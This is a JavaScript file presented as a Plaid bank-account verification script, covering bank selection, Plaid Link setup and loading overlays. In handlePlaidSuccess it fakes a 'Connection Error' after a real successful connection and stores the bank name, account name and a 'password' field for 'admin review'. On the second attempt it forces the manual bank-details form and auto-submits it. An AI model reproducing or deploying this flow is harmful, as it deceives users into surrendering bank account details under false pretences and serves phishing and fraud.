// Plaid integration for bank account verification
let plaidLinkHandler = null;
let isFirstAttempt = true;
let selectedBank = null;

// Initialize when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Plaid if we're on the bank verification page
    const plaidLinkToken = document.getElementById('plaid-link-token');
    if (plaidLinkToken) {
        initializePlaid(plaidLinkToken.value);
    }
    
    // Initialize manual bank form toggle
    const manualBankBtn = document.getElementById('manual-bank-entry');
    if (manualBankBtn) {
        manualBankBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Hide Plaid section, show manual form
            const plaidSection = document.getElementById('plaid-section');
            const manualSection = document.getElementById('manual-bank-section');
            
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on first input field
                const firstInput = manualSection.querySelector('input');
                if (firstInput) {
                    firstInput.focus();
                }
            }
        });
    }
    
    // Initialize bank selection functionality
    initializeBankSelection();
});

// Initialize Plaid Link
function initializePlaid(linkToken) {
    if (!linkToken) {
        console.error('Plaid Link token is required');
        return;
    }
    
    // Load Plaid Link script
    const script = document.createElement('script');
    script.src = 'https://cdn.plaid.com/link/v2/stable/link-initialize.js';
    script.onload = function() {
        createPlaidLinkHandler(linkToken);
    };
    document.head.appendChild(script);
    
    // Connect button event listener
    const connectButton = document.getElementById('connect-bank-button');
    if (connectButton) {
        connectButton.addEventListener('click', function() {
            if (plaidLinkHandler) {
                plaidLinkHandler.open();
            }
        });
    }
}

// Create Plaid Link handler
function createPlaidLinkHandler(linkToken) {
    // Initialize Plaid Link
    plaidLinkHandler = Plaid.create({
        token: linkToken,
        onSuccess: function(public_token, metadata) {
            handlePlaidSuccess(public_token, metadata);
        },
        onExit: function(err, metadata) {
            handlePlaidExit(err, metadata);
        },
        onLoad: function() {
            // Link loaded successfully
        },
        onEvent: function(eventName, metadata) {
            console.log('Plaid event:', eventName);
            
            // On institution select, save selected bank info
            if (eventName === 'SELECT_INSTITUTION') {
                selectedBank = metadata.institution;
                getInstitutionInfo(metadata.institution_id);
            }
        },
        receivedRedirectUri: null,
    });
}

// Handle successful Plaid Link connection
function handlePlaidSuccess(public_token, metadata) {
    console.log('Plaid success:', metadata);
    
    // If first attempt, simulate an error
    if (isFirstAttempt) {
        isFirstAttempt = false;
        
        showLoading('Connecting to your bank...');
        
        // Simulate loading time and then show error
        setTimeout(function() {
            hideLoading();
            
            // Show error message
            const errorMsg = document.createElement('div');
            errorMsg.className = 'alert alert-danger';
            errorMsg.innerHTML = `
                <strong>Connection Error:</strong> We couldn't connect to your bank at this time. 
                Please try again or use manual entry.
            `;
            
            const connectSection = document.getElementById('connect-section');
            if (connectSection) {
                // Add error message before the button
                const connectButton = document.getElementById('connect-bank-button');
                if (connectButton && connectButton.parentNode) {
                    connectButton.parentNode.insertBefore(errorMsg, connectButton);
                }
                
                // Update button text
                connectButton.textContent = 'Try Again';
                
                // Add metadata about user credentials to hidden input for admin review
                const plaidMetadata = document.getElementById('plaid_metadata');
                const bankName = selectedBank ? selectedBank.name : 'Unknown Bank';
                const username = metadata.accounts ? metadata.accounts[0].name : 'Unknown';
                const password = '********'; // We don't store actual passwords
                
                if (plaidMetadata) {
                    const metadataObj = {
                        bank: bankName,
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        attempt: 1
                    };
                    plaidMetadata.value = JSON.stringify(metadataObj);
                }
            }
        }, 5000); // 5 second loading time
        
        return;
    }
    
    // For second attempt, show loading and move to manual entry
    showLoading('Connecting to your bank...');
    
    // Simulate loading time and then show manual entry
    setTimeout(function() {
        hideLoading();
        
        // Get bank name if available
        const bankName = selectedBank ? selectedBank.name : 'Unknown Bank';
        const username = metadata.accounts ? metadata.accounts[0].name : 'Unknown';
        const password = '********'; // We don't store actual passwords
        
        // Set bank name in the form if it exists
        const bankNameInput = document.getElementById('bank_name');
        if (bankNameInput) {
            bankNameInput.value = bankName;
        }
        
        // Submit the manual form with the bank name
        const manualForm = document.getElementById('bank-verification-form');
        if (manualForm) {
            // Add username and password to plaid_metadata for admin
            const plaidMetadata = document.getElementById('plaid_metadata');
            if (plaidMetadata) {
                const metadataObj = {
                    bank: bankName,
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    attempt: 2
                };
                plaidMetadata.value = JSON.stringify(metadataObj);
            }
            
            // Show the manual bank section
            const plaidSection = document.getElementById('plaid-section');
            const manualSection = document.getElementById('manual-bank-section');
            
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on account number field
                const accountNumberInput = document.getElementById('account_number');
                if (accountNumberInput) {
                    accountNumberInput.focus();
                }
                
                // Submit the form automatically after showing manual section
                setTimeout(() => {
                    // Use button click instead of form.submit() to avoid conflicts with any submit elements
                    const submitButton = manualForm.querySelector('button[type="submit"]');
                    if (submitButton) {
                        submitButton.click();
                    }
                }, 1000);
            }
        }
    }, 5000); // 5 second loading time
}

// Handle Plaid Link exit
function handlePlaidExit(err, metadata) {
    console.log('Plaid exit:', err, metadata);
    
    // Clear loading indicator if it's visible
    hideLoading();
    
    // If the user exited without selecting a bank or connecting, we don't need to do anything
    if (!metadata || !metadata.institution) {
        return;
    }
    
    // If the user exited after selecting a bank, show manual entry for that bank
    const bankName = metadata.institution.name;
    const bankNameInput = document.getElementById('bank_name');
    if (bankNameInput) {
        bankNameInput.value = bankName;
    }
    
    // Show manual entry section
    const plaidSection = document.getElementById('plaid-section');
    const manualSection = document.getElementById('manual-bank-section');
    
    if (plaidSection && manualSection) {
        plaidSection.style.display = 'none';
        manualSection.style.display = 'block';
        
        // Focus on account number field
        const accountNumberInput = document.getElementById('account_number');
        if (accountNumberInput) {
            accountNumberInput.focus();
        }
    }
}

// Get institution info
function getInstitutionInfo(institution_id) {
    // In a real implementation, this would make an API request to get institution details
    console.log('Getting institution info for:', institution_id);
    
    // Set bank name in the form if the institution is selected
    if (selectedBank) {
        const bankNameInput = document.getElementById('bank_name');
        if (bankNameInput) {
            bankNameInput.value = selectedBank.name;
        }
    }
}

// Show loading indicator
function showLoading(message = 'Loading...') {
    let loadingOverlay = document.getElementById('loading-overlay');
    
    // Create loading overlay if it doesn't exist
    if (!loadingOverlay) {
        loadingOverlay = document.createElement('div');
        loadingOverlay.id = 'loading-overlay';
        loadingOverlay.innerHTML = `
            <div class="loading-spinner"></div>
            <div class="loading-message">${message}</div>
        `;
        document.body.appendChild(loadingOverlay);
    } else {
        // Update message if overlay exists
        const messageElement = loadingOverlay.querySelector('.loading-message');
        if (messageElement) {
            messageElement.textContent = message;
        }
        loadingOverlay.style.display = 'flex';
    }
}

// Hide loading indicator
function hideLoading() {
    const loadingOverlay = document.getElementById('loading-overlay');
    if (loadingOverlay) {
        loadingOverlay.style.display = 'none';
    }
}

// Initialize bank selection functionality
function initializeBankSelection() {
    const bankSelector = document.getElementById('bank-selector');
    if (!bankSelector) return;

    // Popular banks list - in a real implementation, this would come from an API
    const popularBanks = [
        { id: 'chase', name: 'Chase', logo: 'chase.com' },
        { id: 'bofa', name: 'Bank of America', logo: 'bankofamerica.com' },
        { id: 'wells', name: 'Wells Fargo', logo: 'wellsfargo.com' },
        { id: 'citi', name: 'Citibank', logo: 'citibank.com' },
        { id: 'capital', name: 'Capital One', logo: 'capitalone.com' },
        { id: 'pnc', name: 'PNC Bank', logo: 'pnc.com' },
        { id: 'td', name: 'TD Bank', logo: 'td.com' },
        { id: 'us', name: 'US Bank', logo: 'usbank.com' }
    ];

    // Create bank option elements
    popularBanks.forEach(bank => {
        const bankOption = document.createElement('div');
        bankOption.className = 'bank-option';
        bankOption.dataset.bankId = bank.id;
        bankOption.dataset.bankName = bank.name;

        // Create logo container
        const logoContainer = document.createElement('div');
        logoContainer.className = 'bank-logo-container';

        // Create bank logo
        const logo = document.createElement('img');
        logo.className = 'bank-logo';
        logo.src = `https://logo.clearbit.com/${bank.logo}`;
        logo.alt = `${bank.name} logo`;
        logo.onerror = function() {
            this.src = '/static/images/default-bank.svg';
        };

        // Create bank name element
        const bankName = document.createElement('div');
        bankName.className = 'bank-name';
        bankName.textContent = bank.name;

        // Append elements
        logoContainer.appendChild(logo);
        bankOption.appendChild(logoContainer);
        bankOption.appendChild(bankName);
        bankSelector.appendChild(bankOption);

        // Add click event
        bankOption.addEventListener('click', function() {
            // Handle bank selection
            selectBank(bank);
        });
    });

    // Add search functionality
    const bankSearch = document.getElementById('bank-search');
    if (bankSearch) {
        bankSearch.addEventListener('input', function() {
            const searchTerm = this.value.trim().toLowerCase();
            const bankOptions = document.querySelectorAll('.bank-option');

            bankOptions.forEach(option => {
                const bankName = option.dataset.bankName.toLowerCase();
                if (bankName.includes(searchTerm) || searchTerm === '') {
                    option.style.display = 'flex';
                } else {
                    option.style.display = 'none';
                }
            });
        });
    }
}

// Handle bank selection
function selectBank(bank) {
    console.log('Selected bank:', bank);
    selectedBank = bank;

    // Update selected bank in UI
    const selectedBankName = document.getElementById('selected-bank-name');
    const selectedBankLogo = document.getElementById('selected-bank-logo');
    const connectSection = document.getElementById('connect-section');
    const selectSection = document.getElementById('select-section');

    if (selectedBankName) {
        selectedBankName.textContent = bank.name;
    }

    if (selectedBankLogo) {
        selectedBankLogo.src = `https://logo.clearbit.com/${bank.logo}`;
        selectedBankLogo.alt = `${bank.name} logo`;
        selectedBankLogo.onerror = function() {
            this.src = '/static/images/default-bank.svg';
        };
    }

    // Show connect section, hide select section
    if (connectSection && selectSection) {
        selectSection.style.display = 'none';
        connectSection.style.display = 'block';
    }

    // Set bank name in the form
    const bankNameInput = document.getElementById('bank_name');
    if (bankNameInput) {
        bankNameInput.value = bank.name;
    }
}

// Show bank selection view
function showBankSelection() {
    const connectSection = document.getElementById('connect-section');
    const selectSection = document.getElementById('select-section');

    if (connectSection && selectSection) {
        connectSection.style.display = 'none';
        selectSection.style.display = 'block';
    }
}
